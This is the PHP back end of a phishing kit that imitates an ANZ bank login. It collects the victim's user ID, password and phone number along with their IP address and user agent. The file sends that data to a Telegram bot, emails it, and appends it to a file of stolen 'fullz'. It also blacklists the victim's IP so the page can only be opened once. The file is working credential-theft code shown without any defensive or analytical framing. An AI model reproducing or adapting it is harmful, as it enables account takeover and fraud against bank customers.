<?php
error_reporting(0);    
    $ip = $_SERVER['REMOTE_ADDR'];
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $message = "";
    
    $subject = "ANZ Login + Mobile by $ip";
        
	$message = "|------------- ANZ Login -------------|\n";
    $message .= "Userid              : ".$_POST['email']."\n";
    $message .= "Password           : ".$_POST['password']."\n";
    $message .= "|------------ ANZ Billing ------------|\n";
    $message .= "Phone Number       : ".$_POST['mobile']."\n";
    $message .= "|----------- I N F O | I P ------------|\n";
    $message .= "|Site              : ".getSite()."\n";
    $message .= "|Client IP         : ".$ip."\n";
    $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
    $message .= "User Agent         : ".$useragent."\n";

    // if($Encrypt==1) {
        // $method = 'aes-256-cbc';
        // $key = substr(hash('sha256', $password, true), 0, 32);
        // $iv = chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0);
        // $encrypted = base64_encode(openssl_encrypt($message1, $method, $key, OPENSSL_RAW_DATA, $iv));
    // }
	if($Send_Telegram){
        file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );
    }

	
    if($Send_Log==1) {
        mail($send,$subject,$message);
    }
    
    if($Save_Log==1) {
        $file=fopen("Logs/ANZ Fullz.txt","a");
        fwrite($file,$message);
        fclose($file);
    }

    if($One_Time_Access){        
        $ip = $_SERVER['REMOTE_ADDR'];
        $fp = fopen("includes/blacklist.dat", "a");
        fputs($fp, "\r\n$ip\r\n");
        fclose($fp);
        session_destroy();
    }
?>